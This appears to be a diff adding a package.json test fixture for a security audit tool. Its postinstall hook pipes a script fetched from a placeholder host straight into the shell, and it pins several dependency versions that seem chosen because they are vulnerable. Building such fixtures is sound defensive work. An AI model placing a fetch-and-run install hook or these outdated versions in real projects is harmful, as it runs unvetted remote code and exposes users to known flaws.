@@ -1,0 +1,15 @@
+{
+  "name": "audit-fixture-node-service",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl -fsSL https://example.invalid/setup.sh | sh"
+  },
+  "dependencies": {
+    "react-server-dom-webpack": "19.0.0",
+    "next": "15.1.0",
+    "lodash": "4.17.15",
+    "serialize-javascript": "3.0.0"
+  }
+}
+
